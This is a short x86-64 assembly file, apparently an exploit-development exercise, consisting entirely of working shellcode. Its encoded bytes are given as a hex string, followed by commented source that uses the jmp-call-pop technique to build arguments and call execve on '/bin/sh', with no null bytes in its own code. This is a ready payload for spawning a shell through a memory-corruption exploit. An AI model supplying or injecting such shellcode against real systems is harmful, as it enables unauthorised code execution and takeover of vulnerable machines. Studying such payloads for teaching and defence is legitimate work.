;\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43


global _start

section .text

_start:
       jmp find_address

shellcode:
       xor rax, rax


       ; get the address of the string
       pop rdi

       ; covert the A-> 0x0 to null terminate the string
       mov [rdi +7], byte ah
       

       ;copy the address of the string in rdi to BBB
       mov [rdi +8], rdi


       ;copy the NULL 0x000000000000 -> cccccc

       mov [rdi + 16], rax


       ; setup the adress

       lea rsi, [rdi +8]
       lea rdx, [rdi +16]

       add rax, 59
       syscall


find_address:
       call shellcode

shell_path_string: db "/bin/shABBBBBBBBCCCCCCCC"


